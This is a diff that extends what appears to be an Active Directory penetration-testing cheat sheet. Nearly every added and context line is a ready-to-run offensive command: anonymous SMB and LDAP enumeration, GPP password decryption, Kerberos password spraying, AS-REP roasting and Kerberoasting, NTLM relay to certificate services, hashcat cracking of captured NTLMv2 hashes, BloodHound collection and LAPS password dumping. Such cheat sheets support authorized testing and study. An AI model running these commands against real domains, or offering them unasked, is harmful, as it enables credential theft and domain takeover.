@@ -32,12 +32,18 @@ netexec smb $targetip
 # 1.3 SMB/LDAP Signing Status (check relay feasibility)
 netexec smb $targetip --signing
 netexec ldap $targetip --signing
+ldapsearch -H ldap://$targetip -x -ZZ || echo "Signing/StartTLS enforced"
+
 
 # 1.4 SMB Shares — Anonymous & authenticated enumeration
+# Quick anonymous login test
+smbclient -N -L //$targetip 2>&1 | grep -i "Anonymous"
+
 smbclient -L //$targetip/ -N
 smbmap -H $targetip
 smbmap -H $targetip -u $user -p "$password"
 netexec smb $targetip --shares
+
 
 # 1.5 SYSVOL & GPP — Find Group Policy passwords (cpassword)
 smbclient //$targetip/SYSVOL -N -c "recurse;ls"
@@ -46,6 +52,9 @@ find . -name "*.xml"
 gpp-decrypt <HASH>
 
 # 1.6 NetExec Discovery Modules — quick AD recon
+# Full NetExec sweep
+netexec smb $targetip -u '' -p '' --users --groups --shares --pass-pol --sessions --lsa --spider .
+
 netexec smb $targetip -M spider
 netexec smb $targetip --users
 netexec smb $targetip --groups
@@ -54,6 +63,8 @@ netexec smb $targetip -M webdav
 
 # 1.7 Kerberos Time Sync — Required for ticket operations
 ntpdate -q $targetip
+chronyc tracking
+rdate -n $targetip
 
 # Domain Trust Enumeration (forest / external trust mapping)
 nltest /domain_trusts
@@ -67,6 +78,10 @@ nltest /dsgetdc:$domain
 
 # 2.1 Get baseDN — required for all LDAP queries
 ldapsearch -x -H ldap://$targetip -s base
+
+# Auto-fetch baseDN (no need to manually type DN)
+basedn=$(ldapsearch -x -H ldap://$targetip -s base | grep namingContexts | awk '{print $2}')
+
 
 # 2.2 Enumerate all users in the directory
 ldapsearch -x -H ldap://$targetip -b "$basedn" "(objectClass=user)" sAMAccountName description mail memberOf
@@ -119,8 +134,19 @@ kerbrute passwordspray -d $domain --dc $targetip users.txt 'Password1!'
 # 3.3 AS-REP Roast — Users with DoNotRequirePreAuth
 impacket-GetNPUsers $domain/ -dc-ip $targetip -no-pass -usersfile users.txt -format john -outputfile asrep.txt
 
+# LDAP filter for users with DoNotRequirePreAuth
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
+
+
 # 3.4 Kerberoast — Request service tickets (SPNs)
 impacket-GetUserSPNs $domain/$user:"$password" -dc-ip $targetip -request -format john -outputfile kerberoast.txt
+
+# Anonymous SPN discovery (if allowed)
+ldapsearch -x -H ldap://$targetip -b "$basedn" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
+
+# Filter roastable SPNs
+impacket-GetUserSPNs $domain/$user:"$password" -dc-ip $targetip | grep -i "ServicePrincipalName"
+
 
 # 3.5 Request TGT / ST — For delegation & Kerberos PTH
 impacket-getTGT $domain/$user:"$password"
@@ -306,6 +332,8 @@ ntlmrelayx.py --adcs --template "User" -t http://$targetip --no-http-server
 # Block SMB to make relay more effective
 iptables -A INPUT -p tcp --dport 445 -j DROP
 
+hashcat -m 5600 captured.ntlmv2 -a 0 rockyou.txt
+
 
 ======================================================================
 # 11. DPAPI Credential Extraction
@@ -377,6 +405,9 @@ nltest /trusted_domains
 # BloodHound collection (Python ingestor)
 # Gathers users, groups, ACLs, sessions, local admins, GPOs, trust paths
 bloodhound-python -d $domain -u $user -p "$password" -ns $targetip -c All
+
+Better optimized:
+bloodhound-python -d $domain -u $user -p "$password" --zip --dns-tcp -ns $targetip -c All
 
 
 ======================================================================
@@ -462,6 +493,9 @@ certipy auth -pfx targetuser.pfx -dc-ip $targetip
 # 19. LAPS ENUMERATION (LOCAL ADMIN PASSWORD SOLUTION)
 ======================================================================
 
+# Auto-dump LAPS passwords
+netexec ldap $targetip -u $user -p "$password" --laps
+
 # Enumerate machines storing LAPS passwords
 ldapsearch -x -H ldap://$targetip -b "$basedn" "(ms-Mcs-AdmPwd=*)" name ms-Mcs-AdmPwdExpirationTime
 
@@ -503,6 +537,7 @@ nmap -p389 --script ldap-rootdse $targetip
 tcpdump -i tun0 "udp port 5355"   # LLMNR
 tcpdump -i tun0 "udp port 137"    # NBNS
 
+curl -I --ntlm --user "$user:$password" http://$targetip
 
 ======================================================================
 # 22. PASSWORD POLICY & PASSWORD ANALYTICS
